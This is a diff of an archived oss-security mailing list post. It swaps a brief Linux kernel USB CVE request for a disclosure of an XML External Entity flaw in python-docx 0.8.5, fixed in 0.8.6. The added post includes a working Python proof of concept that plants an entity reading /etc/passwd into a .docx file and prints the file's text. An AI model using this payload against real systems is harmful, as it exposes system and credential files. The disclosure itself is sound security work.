@@ -1,19 +1,109 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/11/9
-Message-ID: <1615034640.35544346.1457701364544.JavaMail.zimbra@redhat.com>
-Date: Fri, 11 Mar 2016 08:02:44 -0500 (EST)
-From: Vladis Dronov <vdronov@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/06/28/7
+Message-ID: <CAO8=cJ9uNJNtPb-GVqq168h4ODCkaxS6W+bX2DFMtpty-MJh2g@mail.gmail.com>
+Date: Tue, 28 Jun 2016 17:31:22 -0400
+From: Pierre Ernst <pernst@...esforce.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE request -- linux kernel: crash on invalid USB device descriptors (digi_acceleport driver)
+Subject: CVE request - python-docx 0.8.5 - XXE
 Content-Type: text/plain; charset=utf-8
 
-Hello,
-If possible, we would like to obtain a CVE-ID for the securuty
-flaw (kernel panic on connecting fake usb device) described in:
+The python-docx package
+(https://github.com/python-openxml/python-docx) is vulnerable to XML
+External Entity attacks (XXE).
 
-http://seclists.org/bugtraq/2016/Mar/61
+Version 0.8.6 (https://github.com/python-openxml/python-docx/releases/tag/v0.8.6)
+contains a fix.
 
-https://bugzilla.redhat.com/show_bug.cgi?id=1283378
+I would like to thanks Steve Canny for the prompt response.
 
-Best regards,
-Vladis Dronov | Red Hat, Inc. | Product Security Engineer
+The following POC has been tested on version 0.8.5.
+
+Older versions of the package might be vulnerable as well.
+
+
+import docx
+import zipfile
+import tempfile
+import os
+
+# define malicious XML
+xml_string = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE w:document [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
+]>
+<w:document xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
+xmlns:v="urn:schemas-microsoft-com:vml"
+xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
+xmlns:w10="urn:schemas-microsoft-com:office:word"
+xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing">
+<w:body>
+<w:p>
+<w:pPr>
+<w:pStyle w:val="Normal" />
+<w:rPr></w:rPr>
+</w:pPr>
+<w:r>
+<w:rPr></w:rPr>
+<w:t>
+Pierre Ernst, Salesforce --[&xxe;]--
+</w:t>
+</w:r>
+</w:p>
+<w:p>
+<w:pPr>
+<w:pStyle w:val="Normal" />
+<w:rPr></w:rPr>
+</w:pPr>
+<w:r>
+<w:rPr></w:rPr>
+<w:t></w:t>
+</w:r>
+</w:p>
+<w:sectPr>
+<w:type w:val="nextPage" />
+<w:pgSz w:w="12240" w:h="15840" />
+<w:pgMar w:left="1134" w:right="1134" w:header="0" w:top="1134"
+w:footer="0" w:bottom="1134" w:gutter="0" />
+<w:pgNumType w:fmt="decimal" />
+<w:formProt w:val="false" />
+<w:textDirection w:val="lrTb" />
+</w:sectPr>
+</w:body>
+</w:document>'''
+
+# source: http://stackoverflow.com/questions/25738523/how-to-update-one-file-inside-zip-file-using-python
+def updateZip(zipname, filename, data):
+    # generate a temp file
+    tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(zipname))
+    os.close(tmpfd)
+
+    # create a temp copy of the archive without filename
+    with zipfile.ZipFile(zipname, 'r') as zin:
+        with zipfile.ZipFile(tmpname, 'w') as zout:
+            for item in zin.infolist():
+                if item.filename != filename:
+                    zout.writestr(item, zin.read(item.filename))
+
+    # replace with the temp archive
+    os.remove(zipname)
+    os.rename(tmpname, zipname)
+
+    # now add filename with its new data
+    with zipfile.ZipFile(zipname, mode='a',
+compression=zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr(filename, data)
+
+# update legit docx file with malicious XML
+updateZip('whatever.docx', 'word/document.xml', xml_string)
+
+# process with python-docx
+document = docx.Document('whatever.docx')
+print '\n\n'.join([paragraph.text for paragraph in document.paragraphs])
+
+
+
+
+-- 
+Pierre Ernst
+Salesforce
